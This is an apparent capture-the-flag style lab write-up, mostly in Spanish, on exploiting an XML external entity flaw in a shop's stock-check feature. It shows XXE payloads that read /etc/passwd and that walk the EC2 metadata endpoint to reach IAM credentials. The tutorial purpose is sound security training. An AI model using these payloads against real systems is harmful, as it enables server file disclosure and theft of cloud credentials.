# Lab: Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

## üìù Introducci√≥n

Este laboratorio simula un escenario realista en entornos de nube, donde una aplicaci√≥n web vulnerable a **XXE** es explotada para realizar un ataque de tipo **SSRF** contra el **endpoint de metadatos de una instancia EC2 de AWS**.

La funcionalidad vulnerable es `Check stock`, la cual acepta entradas en formato XML, las analiza mediante un parser no seguro, y refleja parte del contenido procesado en la respuesta. Esto habilita la inyecci√≥n de entidades externas (`<!ENTITY>`), que pueden ser utilizadas para hacer que el servidor realice solicitudes HTTP internas arbitrarias.

El servidor tiene habilitado el endpoint de metadatos en `http://169.254.169.254/`, una direcci√≥n IP reservada que las instancias EC2 usan para acceder a datos sensibles como credenciales de IAM, configuraci√≥n de red, o el hostname. Si el servidor permite resolver entidades externas desde esta direcci√≥n, un atacante puede extraer credenciales sensibles directamente.

---

### üéØ Objetivo

Explotar la vulnerabilidad **XXE ‚Üí SSRF** para acceder al endpoint `http://169.254.169.254/latest/meta-data/iam/security-credentials/` y recuperar la **clave secreta del IAM role** asignado a la instancia, resolviendo as√≠ el laboratorio.


Iniciamos el laboratorio y nos encontramos con una aplicaci√≥n de compras online:
![image](https://github.com/user-attachments/assets/e11d3138-8859-4bfb-b15a-0b72d2b0dd89)

Accedemos al detalle de un producto haciendo click en `View details`:
![image](https://github.com/user-attachments/assets/f8676e22-e348-4666-8e8f-bb4c9ff61c31)

El laboratorio nos habla de una funcionalidad `Check store` que parsea input XML, por lo que accedemos a la funcionalidad `Check store` para analizarla haciendo click en el bot√≥n `Check stock`, el cual nos devuelve 108 unidades de stock:
![image](https://github.com/user-attachments/assets/bfd2357c-f5e2-47fb-a189-1cc909c57489)


Al igual que en el laboratorio anterior, estamos enviando informaci√≥n a trav√©s de XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```
El servidor responde con 108, lo que indica que interpreta y procesa correctamente el XML enviado.

Indicios:

- El servidor est√° procesando directamente el contenido XML que el cliente env√≠a, lo cual es el punto de partida para probar inyecciones de entidades externas.

- No hay evidencias de validaci√≥n ni sanitizaci√≥n del XML.

- Si el servidor usa un parser vulnerable que permite entidades externas, podr√≠amos intentar algo como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY test "test"> ]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Enviamos la petici√≥n al `Repeater` y vemos c√≥mo se comporta el servidor al enviarle el payload anterior:
![image](https://github.com/user-attachments/assets/3031e57e-bffd-4f0e-a56d-0a4a52b08c02)

En este caso estamos definiendo un `DTD` que contiene una entidad interna `test` con el valor "test".
Aunque en este ejemplo **no estamos utilizando la entidad `&test;` dentro del XML**, esto **sirve como prueba inicial** para verificar si el servidor acepta la inclusi√≥n de un `DOCTYPE`. Esto puede revelar si:

- El parser XML est√° configurado para **procesar DTDs internos**.
- Existen **controles de seguridad que bloqueen la definici√≥n de entidades** (por ejemplo, filtros WAF).
- Se producen errores de parsing, lo cual podr√≠a indicar una **superficie vulnerable a ataques XXE**.


El siguiente paso es confirmar si el servidor resuelve y expande entidades, por lo que referenciaremos la entidad:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY test "XXE Working"> ]>
<stockCheck>
  <productId>&test;</productId>
  <storeId>1</storeId>
</stockCheck>
```

![image](https://github.com/user-attachments/assets/1140da8b-d780-4aaa-9076-d4c39cb7e114)

El servidor respondi√≥ `"Invalid product ID: XXE Working"`, esto prueba que:

- El parser XML acept√≥ la definici√≥n <!ENTITY>.

- La entidad `&test;` fue resuelta correctamente.

- El contenido de la entidad fue inyectado din√°micamente en el valor del productId.

- El servidor reflej√≥ ese valor en la respuesta.

Este es un ejemplo de XXE cl√°sico tipo ‚Äúdata disclosure‚Äù, donde un atacante podr√≠a en lugar de "XXE Working", ingresar una entidad externa, por ejemplo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Analizamos la request en Burp Suite:
![image](https://github.com/user-attachments/assets/4b8b1e99-7d54-4b7e-80e3-db38386875a5)

Esta captura confirma de forma indiscutible que se explot√≥ exitosamente una vulnerabilidad de tipo XML External Entity - File Disclosure.

Este comportamiento muestra:

- Que el parser XML est√° mal configurado (no tiene desactivado el procesamiento de entidades externas).

- Que no hay validaci√≥n ni filtrado del contenido XML por parte del backend.

- Que un atacante puede leer archivos arbitrarios del servidor (Local File Disclosure).

Hata ahora la resoluci√≥n viene siendo id√©ntica al laboratorio anterior, este es el momento de buscar la explotaci√≥n de un SSRF como pide el enunciado.

---

### üåê Explotaci√≥n XXE ‚Üí SSRF

El enunciado del laboratorio nos indica que el servidor tiene acceso al endpoint reservado `http://169.254.169.254/`, t√≠pico de instancias EC2 de Amazon Web Services. Este endpoint contiene informaci√≥n sensible, como las credenciales IAM de la m√°quina.

Vamos a modificar el payload para que en lugar de leer un archivo del sistema (`file:///etc/passwd`), haga una solicitud a este endpoint interno. El objetivo inicial es obtener el nombre del perfil IAM:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Para llegar a esa ruta podr√≠amos intentar utilizar el siguiente payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Analizamos la respuesta del servidor, notamos que nos devuelve `latest`:
![image](https://github.com/user-attachments/assets/fd80c448-f166-462b-8b7d-c969593f014e)

Procedemos a dirigirnos a `/latest` y el servidor nos devuelve `meta-data`:
![image](https://github.com/user-attachments/assets/b634059c-619a-43b8-a877-77a313f8560d)

Nos dirigimos a `/latest/meta-data` y el servidor nos responde con `iam`
![image](https://github.com/user-attachments/assets/0d7ee2a4-047d-4ec0-abbb-c3ab6a761b05)

Accedemos a `/latest/meta-data/iam/` y el servidor nos devuelve `security-credentials`:
![image](https://github.com/user-attachments/assets/7948a421-a136-402e-8f71-5a47f1542b29)

Por lo que actualmente nos falta ingresar al endpoint `http://169.254.169.254/latest/meta-data/iam/security-credentials/` que nos devuelve `admin`:
![image](https://github.com/user-attachments/assets/094e06ab-3682-4a98-9b5e-09a3fd60e5c8)

Accedemos al endpoint `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`:
![image](https://github.com/user-attachments/assets/a600c8b7-208d-4fd3-9f75-72f795f78a73)











